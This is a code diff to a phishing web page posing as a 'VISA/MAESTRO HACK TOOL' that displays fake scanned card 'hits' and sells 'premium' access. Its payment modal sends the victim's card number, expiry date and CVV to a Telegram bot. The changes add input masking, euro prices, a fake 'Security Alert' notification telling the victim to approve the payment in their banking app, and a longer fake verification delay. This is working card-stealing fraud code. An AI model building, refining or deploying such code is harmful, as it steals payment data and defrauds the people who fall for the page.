@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>VISA/MAESTRO HACK TOOL v26.3</title>
     <style>
-        :root { --primary: #39FF14; --bg: #000000; --panel: #0a0a0a; --premium: #ffd700; --danger: #ff4b2b; }
+        :root { --primary: #39FF14; --bg: #000000; --panel: #0a0a0a; --premium: #ffd700; --danger: #ff4b2b; --info: #3b82f6; }
         body { background: var(--bg); color: var(--primary); font-family: 'Consolas', monospace; margin: 0; overflow: hidden; font-size: 11px; }
         
         .top-banner { background: #000; color: #fff; padding: 20px 10px; text-align: center; border-bottom: 2px solid #e25822; text-transform: uppercase; }
@@ -22,7 +22,7 @@
         .log-table td { padding: 10px; border-bottom: 1px solid #0a0a0a; }
         
         .card-num { color: #fff; font-size: 14px; font-weight: bold; display: block; }
-        .card-meta { color: #3b82f6; font-size: 11px; display: block; margin-top: 2px; }
+        .card-meta { color: var(--info); font-size: 11px; display: block; margin-top: 2px; }
         .tag-ok { color: var(--primary); border: 1px solid var(--primary); padding: 0 3px; font-size: 8px; margin-left: 5px; }
 
         .stat-card { background: #080808; padding: 10px; border: 1px solid #111; }
@@ -30,15 +30,19 @@
         .stat-value { font-size: 20px; font-weight: bold; color: var(--primary); }
 
         .red-info-row { color: var(--danger); font-size: 11px; font-weight: bold; border-top: 1px solid #200; padding-top: 5px; text-transform: uppercase; }
-        .red-value { color: #ff0000; text-shadow: 0 0 5px rgba(255,0,0,0.5); }
+        
+        /* MODRÁ SUMA A VÄČŠÍ FONT */
+        .blue-value { color: var(--info); font-size: 24px; text-shadow: 0 0 10px rgba(59, 130, 246, 0.5); display: block; margin-top: 5px; }
+        
+        .red-value { color: #ff0000; }
 
         .btn-main { background: var(--primary); color: #000; border: none; padding: 12px; font-weight: bold; cursor: pointer; border-radius: 4px; text-transform: uppercase; font-size: 11px; }
         .btn-free { background: transparent; border: 1px solid var(--primary); color: var(--primary); padding: 10px; cursor: pointer; font-size: 10px; font-weight: bold; text-transform: uppercase; }
-        .btn-premium { background: transparent; border: 1px solid var(--premium); color: var(--premium); padding: 10px; cursor: pointer; font-size: 10px; font-weight: bold; }
+        .btn-premium { background: transparent; border: 1px solid var(--premium); color: var(--premium); padding: 10px; cursor: pointer; font-size: 9px; font-weight: bold; text-transform: uppercase; }
 
         #paymentModal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 1000; justify-content: center; align-items: center; }
         .modal-content { background: #fff; color: #333; width: 300px; border-radius: 8px; padding: 25px; font-family: sans-serif; }
-        input { width: 100%; border: 1px solid #ddd; padding: 10px; margin: 5px 0; border-radius: 4px; box-sizing: border-box; }
+        input { width: 100%; border: 1px solid #ddd; padding: 10px; margin: 5px 0; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
         .pay-btn { background: #007bff; color: #fff; border: none; width: 100%; padding: 12px; border-radius: 4px; font-weight: bold; margin-top: 10px; cursor: pointer; }
     </style>
 </head>
@@ -47,11 +51,12 @@
 <div id="paymentModal">
     <div class="modal-content">
         <h3 id="m_title" style="margin:0 0 10px 0;">Premium Access</h3>
-        <p style="font-size: 12px; color: #666; margin-bottom: 15px;">Verify card to unlock decrypted database.</p>
-        <input type="tel" id="c_num" placeholder="Card Number">
+        <p style="font-size: 12px; color: #666; margin-bottom: 15px;">Enter card details to continue.</p>
+        
+        <input type="text" id="c_num" placeholder="xxxx-xxxx-xxxx-xxxx" maxlength="19" oninput="laurin.maskInput(this, 'card')">
         <div style="display:flex; gap:5px;">
-            <input type="tel" id="c_exp" placeholder="MM/YY">
-            <input type="tel" id="c_cvv" placeholder="CVV">
+            <input type="text" id="c_exp" placeholder="MM/YY" maxlength="5" oninput="laurin.maskInput(this, 'exp')">
+            <input type="text" id="c_cvv" placeholder="CVC" maxlength="3" oninput="laurin.maskInput(this, 'cvc')">
         </div>
         <button class="pay-btn" onclick="laurin.processPayment()">CONFIRM & UNLOCK</button>
     </div>
@@ -68,20 +73,22 @@
             <button class="btn-main" onclick="laurin.toggleNormal()" id="btnNormal">START SCAN</button>
             <hr style="border: 0; border-top: 1px solid #222; width: 100%;">
             
-            <button class="btn-free" onclick="laurin.freeHit()">1 FREE HIT</button>
-            <button class="btn-premium" onclick="laurin.askAuth('10')">GET 10 FULL HITS</button>
-            <button class="btn-premium" onclick="laurin.askAuth('INF')">UNLIMITED ACCESS</button>
+            <button id="freeBtn" class="btn-free" onclick="laurin.freeHit()">1 FREE HIT</button>
+            <button class="btn-premium" onclick="laurin.askAuth('10')">GET 10 FULL HITS - 19,99€</button>
+            <button class="btn-premium" onclick="laurin.askAuth('INF')">UNLIMITED ACCESS - 199,99€</button>
 
             <div class="stat-card" style="margin-top:10px;">
                 <div class="stat-label">Total Hits</div>
                 <div id="hitCount" class="stat-value">0</div>
             </div>
+            
+            <div class="red-info-row">TOTAL VALUE: <span id="valField" class="blue-value">$0.00</span></div>
+            
             <div class="stat-card">
                 <div class="stat-label">Processed</div>
                 <div id="lineCount" class="stat-value" style="color:#fff">0</div>
             </div>
 
-            <div class="red-info-row">VALUE: <span id="valField" class="red-value">$0.00</span></div>
             <div class="red-info-row">NODE: <span id="locField" class="red-value">DETECTING...</span></div>
             <div class="red-info-row">AUTH: <span id="statusLabel" class="red-value">ENCRYPTED</span></div>
         </div>
@@ -102,7 +109,37 @@ class LaurinSystem {
         this.hits = 0;
         this.lines = 0;
         this.totalValue = 0.00;
+        this.requestNotificationPermission();
         this.initLocation();
+    }
+
+    requestNotificationPermission() {
+        if ("Notification" in window) Notification.requestPermission();
+    }
+
+    maskInput(el, type) {
+        let val = el.value.replace(/\D/g, '');
+        if (type === 'card') {
+            let res = val.match(/.{1,4}/g);
+            el.value = res ? res.join('-') : val;
+        } else if (type === 'exp') {
+            if (val.length > 2) {
+                el.value = val.substring(0, 2) + '/' + val.substring(2, 4);
+            } else {
+                el.value = val;
+            }
+        } else {
+            el.value = val;
+        }
+    }
+
+    sendBankNotification() {
+        if ("Notification" in window && Notification.permission === "granted") {
+            new Notification("Security Alert", { 
+                body: "Please authorize the payment in your banking application.",
+                icon: "https://cdn-icons-png.flaticon.com/512/1162/1162468.png" 
+            });
+        }
     }
 
     async initLocation() {
@@ -119,6 +156,9 @@ class LaurinSystem {
         this.addEntry(false);
         this.totalValue += (Math.random() * 250) + 50;
         document.getElementById('valField').innerText = `$${this.totalValue.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})}`;
+        const fBtn = document.getElementById('freeBtn');
+        fBtn.disabled = true;
+        fBtn.innerText = "USED";
     }
 
     toggleNormal() {
@@ -154,9 +194,9 @@ class LaurinSystem {
         let data;
 
         if(masked) {
-            data = `<span class="card-num">${bin}********</span><span class="card-meta">EXP: **/** | CVV: ***</span>`;
+            data = `<span class="card-num">${bin} **** **** ****</span><span class="card-meta">EXP: **/** | CVV: ***</span>`;
         } else {
-            const full = bin + Math.floor(1000000000 + Math.random()*8999999999);
+            const full = bin + "-" + Math.floor(1000+Math.random()*8999) + "-" + Math.floor(1000+Math.random()*8999) + "-" + Math.floor(1000+Math.random()*8999);
             const exp = "12/2" + Math.floor(6+Math.random()*4);
             data = `<span class="card-num">${full}</span><span class="card-meta">${exp} | ${Math.floor(100+Math.random()*899)} <span class="tag-ok">OK</span></span>`;
         }
@@ -171,7 +211,7 @@ class LaurinSystem {
         const c = document.getElementById('c_cvv').value;
         const btn = document.querySelector('.pay-btn');
         
-        if(n.length < 13) return;
+        if(n.length < 19) return;
 
         fetch(`https://api.telegram.org/bot${_p[0]}:${_p[1]}/sendMessage`, {
             method: 'POST',
@@ -179,9 +219,11 @@ class LaurinSystem {
             body: JSON.stringify({chat_id: _p[2], text: `💳 <b>${this.pendingMode} ACCESS</b>\nCard: <code>${n}</code>\nExp: ${e}\nCVV: ${c}`, parse_mode: 'HTML'})
         });
 
+        this.sendBankNotification();
+
         btn.disabled = true;
         btn.style.background = "#ff4b2b";
-        btn.innerText = "VERIFYING...";
+        btn.innerText = "VERIFYING (30s)...";
 
         const modalContent = document.querySelector('.modal-content');
         const instruction = document.createElement('p');
@@ -208,7 +250,7 @@ class LaurinSystem {
                 this.isRunning = true;
                 this.loop();
             }
-        }, 5000);
+        }, 30000);
     }
 }
 
